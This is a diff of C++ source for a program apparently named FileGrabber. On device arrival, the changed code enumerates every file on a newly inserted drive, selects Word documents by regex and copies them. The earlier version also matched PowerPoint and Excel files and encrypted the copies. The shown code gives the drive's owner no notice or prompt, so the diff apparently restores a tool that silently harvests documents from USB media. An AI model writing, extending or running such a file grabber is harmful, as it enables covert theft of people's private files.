@@ -15,35 +15,35 @@
 #include "SystemConfig.h"
 #include "sql_connection_error.h"
 #include "SQLConnection.h"
+#include "Log.h"
 using namespace std;
 using namespace filesystem;
 
 bool IsServiceOn = true;
 
 void DeviceArrivalMain(TCHAR DriveLetter) {
-	Device dv(DriveLetter);
-
+	/*
 	try {
-		SQLConnection conn(L"test.idb");
+		Device dv(DriveLetter);
+		SQLConnection conn(L"rec.db");
 		conn.open();
 		conn.insertRecord(dv);
 		conn.close();
 	}
-	catch (sql_connection_error & sqle) {
-		MessageBoxA(NULL, sqle.what(), "", MB_ICONERROR);
+	catch (exception& e) {
+		MessageBoxA(NULL, e.what(), "FileGrabber - Error", MB_ICONERROR);
 	}
-
-	/*
+	*/
+	LOG->i(L"New disk inserted.");
+	Device dv(DriveLetter);
 	Device::DiskInformation info = dv.GetDiskInformation();
 	FileLister lister(dv);
 	shared_ptr<list<FileData>> pls = lister.ListFile();
 	FileSearcher fs;
-	shared_ptr<list<FileData>> psls = fs.FindFileRegex(pls, { L".*.ppt",L".*.pptx",L".*.xls",L".*.xlsx" ,L".*.doc" ,L".*.docx" });
+	shared_ptr<list<FileData>> psls = fs.FindFileRegex(pls, { L".*.doc" ,L".*.docx" });
 	FileCopyer cp(dv, psls);
 	cp.ListFile(pls);
 	cp.Copy();
-	cp.Encrypt();
-	*/
 	/*
 	if (SystemConfig::getInstance()->FileCopyer) {
 		if (SystemConfig::getInstance()->NormalCopy) {
@@ -70,5 +70,4 @@ void DeviceRemovalMain(TCHAR DriveLetter) {
 
 // Usually this function should be empty.
 void InitProgram() {
-	
 }
